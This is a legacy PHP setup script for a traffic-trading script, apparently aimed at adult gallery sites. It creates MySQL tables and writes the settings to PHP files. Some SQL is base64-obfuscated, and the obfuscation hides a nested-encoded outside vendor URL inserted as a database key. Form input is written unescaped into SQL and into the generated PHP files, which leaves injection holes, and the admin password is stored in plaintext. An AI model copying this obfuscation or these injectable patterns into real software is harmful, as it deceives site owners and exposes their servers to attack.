<?php
//Traffic-Drive CJ/TGP v5.14 free, setup.php
if ($action != "setup") {
?>
<html>
<head>
<title>Traffic-Drive CJ/TGP v5.14 free Setup</title>
<style type="text/css">
<!--
BODY{font-size:x-small;font-family:arial;color:black;background-color:white;}
a:link { color:black;text-decoration:none;font-weight:bold} 
-->
</style>
</head>
<body>
<table align=center width=90% bgcolor=silver border=1 bordercolor=black cellspacing=0><tr><td width=100% align=center>
<font size=2><b>Traffic-Drive CJ/TGP v5.14 free Setup</b><br>
<a href="http://www.traffic-drive.com/scripts">Traffic-Drive CJ/TGP v5.14 free</a>, get your traffic machine <a href="http://www.traffic-drive.com/scripts">here</a></font>
</td></tr></table>
<form method=POST>
<p align=center>
Warning: If you already have installed Traffic-Drive all previous data will be lost after setup<br>
Setup will create tables <b>mset, tr, hr, sts, gal, bl, rf, ipfrom, ipto, hurl</b> in your database
<br><br>
You can change any values later<br><br>
url: <input type=text style="font-size: x-small; font-family: arial; background-color: white; border-width: 1; border-color: Black; border-style: solid;" name=murl value="http://www.mysite.com/index.php" size="30" maxlength="100">
title: <input type=text style="font-size: x-small; font-family: arial; background-color: white; border-width: 1; border-color: Black; border-style: solid;" name=mtitle value="Title Of MySite" size="30" maxlength="100"><br>
email: <input type=text style="font-size: x-small; font-family: arial; background-color: white; border-width: 1; border-color: Black; border-style: solid;" name=memail value="my@email.com" size="30" maxlength="100">
icq: <input type=text style="font-size: x-small; font-family: arial; background-color: white; border-width: 1; border-color: Black; border-style: solid;" name=micq value="My ICQnumber" size="20" maxlength="20"><br>
ext url: <input type=text style="font-size: x-small; font-family: arial; background-color: white; border-width: 1; border-color: Black; border-style: solid;" name=meurl value="http://www.extraurl.com" size="30" maxlength="100"><br><br>
default trade type:<br>
<input type="Radio" name="dt" value="a" checked>average raw_in-clicks(default, best working)
<input type="Radio" name="dt" value="c">clicks(productivity)
<input type="Radio" name="dt" value="r">raw in
<input type="Radio" name="dt" value="u">unique in
<input type="Radio" name="dt" value="f">force only<br><br>
default ratio: <input style="font-size: x-small; font-family: arial; background-color: white; border-width: 1; border-color: Black; border-style: solid;" type=text name=dr value="120" size="3" maxlength="3">
default hourly force: <input type=text style="font-size: x-small; font-family: arial; background-color: white; border-width: 1; border-color: Black; border-style: solid;" name=df value="3" size="3" maxlength="3">
default group: <input type=text style="font-size: x-small; font-family: arial; background-color: white; border-width: 1; border-color: Black; border-style: solid;" name=dg value="1" size="1" maxlength="1"><br><br>
default in trigger: <input type=text style="font-size: x-small; font-family: arial; background-color: white; border-width: 1; border-color: Black; border-style: solid;" name=dtr value="0" size="3" maxlength="3">
default out trigger: <input type=text style="font-size: x-small; font-family: arial; background-color: white; border-width: 1; border-color: Black; border-style: solid;" name=dotr value="0" size="3" maxlength="3"><br>
default previous hour in trigger: <input type=text style="font-size: x-small; font-family: arial; background-color: white; border-width: 1; border-color: Black; border-style: solid;" name=dhtr value="0" size="3" maxlength="3">
default previous hour out trigger: <input type=text style="font-size: x-small; font-family: arial; background-color: white; border-width: 1; border-color: Black; border-style: solid;" name=dhotr value="0" size="3" maxlength="3"><br>
</p>
<hr color=black>
<p align=center>
recalculate time (seconds): <input type=text style="font-size: x-small; font-family: arial; background-color: white; border-width: 1; border-color: Black; border-style: solid;" name=nrt value="60" size="3" maxlength="3">
unique time (IP-log time) (seconds): <input type=text style="font-size: x-small; font-family: arial; background-color: white; border-width: 1; border-color: Black; border-style: solid;" name=nript value="3600" size="6" maxlength="6"><br>
</p>
<hr color=black>
<p align=center>
<b>In Pages:</b><br>
file extension: <input type=text style="font-size: x-small; font-family: arial; background-color: white; border-width: 1; border-color: Black; border-style: solid;" name=niext value="html" size="6" maxlength="6"><br>
<input type="Radio" name="nitype" value="0">include (SSI don't work in included files)<br>
<input type="Radio" name="nitype" value="1" checked>redirect (only if "i.php" or "index.php" is used as in-file)<br>
</p>
<hr color=black>
<p align=center>
<b>TGP & Real content features:</b><br>
default out to url(hurl) percent: <input type=text style="font-size: x-small; font-family: arial; background-color: white; border-width: 1; border-color: Black; border-style: solid;" name=gp value="50" size="3" maxlength="3"><br>
<input type="Radio" name="ndgfc" value="1" checked>first time click to url(hurl) by default
<input type="Radio" name="ndgfc" value="0">don't use first time click by default<br> 
<input type="Radio" name="ndgtr" value="1" checked>track any click to url(hurl) as first by default
<input type="Radio" name="ndgtr" value="0">don't track any click to url(hurl) as first by default<br> 
</p>
<hr color=black>
<p align=center>
<b>Do not change this section, if you don't want to use target out features</b><br><br>
default out to site with:
<input type="Radio" name="dln" value="a" checked>mixed (default)
<input type="Radio" name="dln" value="p">pictures only
<input type="Radio" name="dln" value="m">movies only<br><br>
<input type="Radio" name="elnwm" value="0" checked>disable webmaster to pick type of site (default)
<input type="Radio" name="elnwm" value="1">enable webmaster to pick type of site<br><br>
default webmaster site type (if webmaster can't pick site type):<br>
<input type="Radio" name="dlnwm" value="a" checked>mixed (default)
<input type="Radio" name="dlnwm" value="p">pictures only
<input type="Radio" name="dlnwm" value="m">movies only<br><br><br>
new site group:<br>
<input type="Radio" name="ngpwmflag" value="1" checked>default group<br>
<input type="Radio" name="ngpwmflag" value="0">enable webmaster to pick the group (non-blank fields):<br>
group 1 <input type=text style="font-size: x-small; font-family: arial; background-color: white; border-width: 1; border-color: Black; border-style: solid;" name="ngpwma[1]" value="" size="20" maxlength="30"><br>
group 2 <input type=text style="font-size: x-small; font-family: arial; background-color: white; border-width: 1; border-color: Black; border-style: solid;" name="ngpwma[2]" value="" size="20" maxlength="30"><br>
group 3 <input type=text style="font-size: x-small; font-family: arial; background-color: white; border-width: 1; border-color: Black; border-style: solid;" name="ngpwma[3]" value="" size="20" maxlength="30"><br>
group 4 <input type=text style="font-size: x-small; font-family: arial; background-color: white; border-width: 1; border-color: Black; border-style: solid;" name="ngpwma[4]" value="" size="20" maxlength="30"><br>
group 5 <input type=text style="font-size: x-small; font-family: arial; background-color: white; border-width: 1; border-color: Black; border-style: solid;" name="ngpwma[5]" value="" size="20" maxlength="30"><br>
group 6 <input type=text style="font-size: x-small; font-family: arial; background-color: white; border-width: 1; border-color: Black; border-style: solid;" name="ngpwma[6]" value="" size="20" maxlength="30"><br>
group 7 <input type=text style="font-size: x-small; font-family: arial; background-color: white; border-width: 1; border-color: Black; border-style: solid;" name="ngpwma[7]" value="" size="20" maxlength="30"><br>
group 8 <input type=text style="font-size: x-small; font-family: arial; background-color: white; border-width: 1; border-color: Black; border-style: solid;" name="ngpwma[8]" value="" size="20" maxlength="30"><br>
group 9 <input type=text style="font-size: x-small; font-family: arial; background-color: white; border-width: 1; border-color: Black; border-style: solid;" name="ngpwma[9]" value="" size="20" maxlength="30"><br>
<br><br>
Include new site in Top List:<br>
<input type="Radio" name="ntlwm" value="1" checked>yes
<input type="Radio" name="ntlwm" value="0">no<br>
</p>
<hr color=black>
<p align=center>
<b>Default out to:</b><br>
<input type="Radio" name="ndogflag" value="1" checked>default group<br>
<input type="Radio" name="ndogflag" value="0">custom groups:<br>
set of groups (divided by "-", e.g.:"1-3-7"): <input type=text style="font-size: x-small; font-family: arial; background-color: white; border-width: 1; border-color: Black; border-style: solid;" name=ndog value="1-2" size="20" maxlength="30">
</p>
<hr color=black>
<p align=center>
max toplist members (0 if you don't want to use toplist features): <input type=text style="font-size: x-small; font-family: arial; background-color: white; border-width: 1; border-color: Black; border-style: solid;" name=topmax value="0" size="3" maxlength="3"><br>
<b>Top List Order:</b><br>
previous hour: <input type="Radio" name="ntoporder" value="rin">rin
<input type="Radio" name="ntoporder" value="uin" checked>uin
<input type="Radio" name="ntoporder" value="cl">cl
<input type="Radio" name="ntoporder" value="gcl">gcl<br>
last 23 hours: <input type="Radio" name="ntoporder" value="drin">rin
<input type="Radio" name="ntoporder" value="duin">uin
<input type="Radio" name="ntoporder" value="dcl">cl
<input type="Radio" name="ntoporder" value="dgcl">gcl<br>
<p>
<hr color=black>
<p align=center>
<input type="Radio" name="nrlog" value="0" checked>don't log refering URLs
<input type="Radio" name="nrlog" value="1">log refering URLs
<p>
<hr color=black>
<p align=center>
Webmaster Signup and Stats Control:<br>
<input type="Radio" name="swmst" value="1" checked>enable webmaster signup
<input type="Radio" name="swmst" value="0">disable webmaster signup<br>
<input type="Radio" name="ewmst" value="1" checked>enable webmaster stats
<input type="Radio" name="ewmst" value="0">disable webmaster stats<br><br>
If Webmaster Stats is enabled:<br>
<input type="Radio" name="rwmst" value="1" checked>show raw in
<input type="Radio" name="rwmst" value="0">don't show raw in<br>
<input type="Radio" name="uwmst" value="1" checked>show unique in
<input type="Radio" name="uwmst" value="0">don't show unique in<br>
<input type="Radio" name="cwmst" value="1" checked>show clicks
<input type="Radio" name="cwmst" value="0">don't show clicks<br>
<input type="Radio" name="gwmst" value="1" checked>show gallery clicks
<input type="Radio" name="gwmst" value="0">don't show gallery clicks<br>
<input type="Radio" name="pwmst" value="1" checked>show productivity
<input type="Radio" name="pwmst" value="0">don't show productivity<br>
<input type="Radio" name="twmst" value="1" checked>show total
<input type="Radio" name="twmst" value="0">don't show total<br>
</p>
<hr color=black>
<p align=center>
admin password: <input type=text style="font-size: x-small; font-family: arial; background-color: white; border-width: 1; border-color: Black; border-style: solid;" name=admpass value="" size="10" maxlength="10"><br>
</p>
<hr color=black>
<p align=center>
MySQL host: <input type=text style="font-size: x-small; font-family: arial; background-color: white; border-width: 1; border-color: Black; border-style: solid;" name=hst value="localhost" size="30" maxlength="30"><br>
MySQL user: <input type=text style="font-size: x-small; font-family: arial; background-color: white; border-width: 1; border-color: Black; border-style: solid;" name=usr value="root" size="30" maxlength="30"><br>
MySQL password: <input type=text style="font-size: x-small; font-family: arial; background-color: white; border-width: 1; border-color: Black; border-style: solid;" name=psw value="" size="30" maxlength="30"><br>
MySQL database name: <input type=text style="font-size: x-small; font-family: arial; background-color: white; border-width: 1; border-color: Black; border-style: solid;" name=db value="mysqldbname" size="30" maxlength="30"><br>
</p>
<table align=center width=90% bgcolor=silver border=1 bordercolor=black cellspacing=0><tr><td width=100% align=center>
<input type=submit name=action value=setup style="border-width: 1; border-style: solid; font-size: x-small; font-family: arial">
</td></tr></table>
</form>
</body>
</html>
<?php
}
else {
?>
<html>
<head>
<title>Traffic-Drive CJ/TGP v5.14 free Setup</title>
<style type="text/css">
<!--
BODY{font-size:x-small;font-family:arial;color:black;background-color:white;}
a:link { color:black;text-decoration:none;font-weight:bold} 
-->
</style>
</head>
<body>
<table align=center width=90% bgcolor=silver border=1 bordercolor=black cellspacing=0><tr><td width=100% align=center>
<font size=2><b>Traffic-Drive CJ/TGP v5.14 free Setup</b><br>
<a href="http://www.traffic-drive.com/scripts">Traffic-Drive CJ/TGP v5.14 free Setup</a>, get your traffic machine <a href="http://www.traffic-drive.com/scripts">here</a></font>
</td></tr></table>
<p align=center>Please, wait ...</p>
<?php
ignore_user_abort(true);if($admpass=="") die ("Go back and fill out admin password");$link=mysql_connect($hst,$usr,$psw) or die ("Could not connect");
?>		
<p align=center>Connected successfully<br>Create tables ...</p>
<?php
mysql_select_db ($db) or die ("Could not select database: ".$db);
$q="drop table ipfrom";$r=mysql_query($q);
$q="drop table ipto";$r=mysql_query($q);
$q="drop table gal";$r=mysql_query($q);
$q="drop table bl";$r=mysql_query($q);
$q="drop table rf";$r=mysql_query($q);
$q="drop table hurl";$r=mysql_query($q);
$q="drop table mset";$r=mysql_query($q);
$q="drop table tr";$r=mysql_query($q);
$q="drop table hr";$r=mysql_query($q);
$q="drop table sts";$r=mysql_query($q);
$q=base64_decode("Y3JlYXRlIHRhYmxlIG1zZXQgKGsgdmFyY2hhcig0MCkgbm90IG51bGwsIG11cmwgdmFyY2hhcigxMDApIG5vdCBudWxsLCBtdGl0bGUgdmFyY2hhcigxMDApLCBtZW1haWwgdmFyY2hhcigxMDApLCBtaWNxIHZhcmNoYXIoMjApLCBkciBpbnQsIGRmIGludCwgZHQgdmFyY2hhcigxKSwgZHRyIGludCwgZG90ciBpbnQsIGFkbXBhc3MgdmFyY2hhcigxMCksIHByaW1hcnkga2V5IChrKSk=");$r=mysql_query($q) or die ("Create mset failed");
$q="alter table mset add dhtr int,add dhotr int";$r=mysql_query($q) or die ("Alter mset failed");
$q=base64_decode("aW5zZXJ0IGludG8gbXNldCB2YWx1ZXMgKCdhSFIwY0RvdkwzZDNkeTVoYkd4dFlYaDRlQzVqYjIwdlpuSmxaUT09Jyw=")."'$murl','$mtitle','$memail','$micq','$dr','$df','$dt','$dtr','$dotr','$admpass','$dhtr','$dhotr')";$r=mysql_query($q) or die ("Insert into mset failed");
$q=base64_decode("Y3JlYXRlIHRhYmxlIHRyIChkIHZhcmNoYXIoMTAwKSBub3QgbnVsbCwgdSB2YXJjaGFyKDEwMCksIHRsIHZhcmNoYXIoMTAwKSwgZW0gdmFyY2hhcigxMDApLCBpY3EgdmFyY2hhcigyMCksIG5pY2sgdmFyY2hhcigyMCksIHB3IHZhcmNoYXIoMjApLCByaW4gaW50LCB1aW4gaW50LCBjbCBpbnQsIGdjbCBpbnQsIG91dCBpbnQsIHIgaW50LCB0IHZhcmNoYXIoMSksIHRyIGludCwgb3RyIGludCwgZG93ZWQgaW50LCBvd2VkIGludCwgYSBpbnQsIGhmIGludCwgbG4gdmFyY2hhcigxKSwgcHJpbWFyeSBrZXkgKGQpKQ==");$r=mysql_query($q) or die ("Create tr failed");
$q="alter table tr add drin int,add duin int,add dcl int,add dgcl int,add dout int,add htr int,add hotr int,add etr varchar(1),add itl varchar(1),add fpr varchar(10)";$r=mysql_query($q) or die ("Alter tr failed");
$q=base64_decode("aW5zZXJ0IGludG8gdHIgdmFsdWVzICgnbm91cmwnLA==")."'$meurl','nourl','no@eml','00000','nourl','','0','0','0','0','0','0','a','0','0','0','0','0','0','a','0','0','0','0','0','0','0','0','0','')";$r=mysql_query($q) or die ("Insert into tr failed");
$q=base64_decode("Y3JlYXRlIHRhYmxlIGhyIChkIHZhcmNoYXIoMTAwKSBub3QgbnVsbA==");
$q1="insert into hr values ('nourl'";
for($i=0;$i<24;$i++){
$q=$q.",rin$i int,uin$i int,cl$i int,gcl$i int,out$i int,f$i int,a$i int";
$q1=$q1.",'0','0','0','0','0','0','0'";}$q=$q.",primary key(d))";
$q1=$q1.")";$r=mysql_query($q) or die ("Create hr failed");
$r=mysql_query($q1) or die ("Insert into hr failed");
$q=base64_decode("Y3JlYXRlIHRhYmxlIHN0cyAoayB2YXJjaGFyKDQwKSBub3QgbnVsbCwgcmluIGludCwgdWluIGludCwgY2wgaW50LCBnY2wgaW50LCBvdXQgaW50LCBwciBpbnQsIGhyaW4gaW50LCBodWluIGludCwgaGNsIGludCwgaGdjbCBpbnQsIGhvdXQgaW50LCBocHIgaW50LCBsdSBpbnQsIGxoIGludCwgY250IGludCwgcHJpbWFyeSBrZXkgKGspKQ==");$r=mysql_query($q) or die ("Create sts failed");
$lu=time();$lh=date("G");$q=base64_decode ("aW5zZXJ0IGludG8gc3RzIHZhbHVlcyAoJ2FIUjBjRG92TDNkM2R5NWhiR3h0WVhoNGVDNWpiMjB2Wm5KbFpRPT0nLCcwJywnMCcsJzAnLCcwJywnMCcsJzAnLCcwJywnMCcsJzAnLCcwJywnMCcsJzAnLA==")."'$lu','$lh','0')";
$r=mysql_query ($q) or die ("Insert into sts failed");
$q="create table bl (d varchar(100) not null, primary key(d))";
$r=mysql_query($q) or die ("Create bl failed");
$q="create table gal (tr varchar(50) not null,cl int,d varchar(100) not null,hr int)";
$r=mysql_query($q) or die ("Create gal failed");
$q="create table rf (d varchar(100) not null,rurl varchar(200),hr int,rin int)";
$r=mysql_query($q) or die ("Create rf failed");
$q="create table hurl (l varchar(50) not null,u varchar(100),primary key(l))";
$r=mysql_query($q) or die ("Create hurl failed");
$q="create table ipfrom (ip varchar(15) not null, d varchar (100), tm int, sf int)";
$r=mysql_query($q) or die ("Create ipfrom failed");
$q="create table ipto (ip varchar(15) not null, d varchar (100), tm int)";
$r=mysql_query($q) or die ("Create ipto failed");
?>		
<p align=center>Write settings to files ...</p>
<?php
$fp=fopen("vars.php" , "w") or die ("Can not create vars.php");
if ($ndogflag=='1') $ndog=$dg; else $ndog=eregi_replace(" ","",$ndog);
$nipref=pathinfo("$murl");$ipref=$nipref["dirname"]."/";
$vars = "<?php\n"."\$hst='$hst';\n"."\$usr='$usr';\n"."\$psw='$psw';\n"."\$db='$db';\n"."\$gp='$gp'; \n"."\$rt='$nrt';\n"."\$dg='$dg'; \n"."\$topmax='$topmax';\n"."\$toporder='$ntoporder';\n"."\$dln='$dln';\n"."\$ript='$nript';\n"."\$rlog='$nrlog';\n"."\$dog='$ndog';\n"."\$dgfc='$ndgfc';\n"."\$dgtr='$ndgtr';\n"."\$iext='$niext';\n"."\$itype='$nitype';\n"."\$ipref='$ipref';\n"."?>";
fwrite($fp, $vars);fclose($fp);
$fp = fopen("wmvars.php" , "w") or die ("Can not create wmvars.php");
$wmvars = "<?php\n"."\$elnwm='$elnwm';\n"."\$dlnwm='$dlnwm';\n"."\$swmst='$swmst';\n"."\$ewmst='$ewmst';\n"."\$rwmst='$rwmst';\n"."\$uwmst='$uwmst';\n"."\$cwmst='$cwmst';\n"."\$gwmst='$gwmst';\n"."\$pwmst='$pwmst';\n"."\$twmst='$twmst';\n"."\$tlwm='$ntlwm';\n";
if ($ngpwmflag==1) $wmvars=$wmvars."\$gpwm='$dg';\n";
else {
$wmvars=$wmvars."\$gpwm='n';\n";
for ($i=1; $i<10; $i++) {
$ngpwma[$i]=trim($ngpwma[$i]);
if ($ngpwma[$i]!="") $wmvars=$wmvars."\$gpwma[$i]='$ngpwma[$i]';\n";
}
}
$wmvars=$wmvars."?>";
fwrite($fp, $wmvars);fclose($fp);
?>
<p align=center><font size=4>Congratulations!<br>Setup Done<br><br><b>Now delete setup.php from your server!</b></font></p>
<table align=center width=90% bgcolor=silver border=1 bordercolor=black cellspacing=0><tr><td width=100% align=center>
<font size=2><b>Traffic-Drive Setup</b><br>
<a href="http://www.traffic-drive.com/scripts">Traffic-Drive CJ/TGP v5.14 free</a>, get your traffic machine <a href="http://www.traffic-drive.com/scripts">here</a></font>
</td></tr></table>
</body>
</html>
<?php
mysql_close ($link);
}
?>
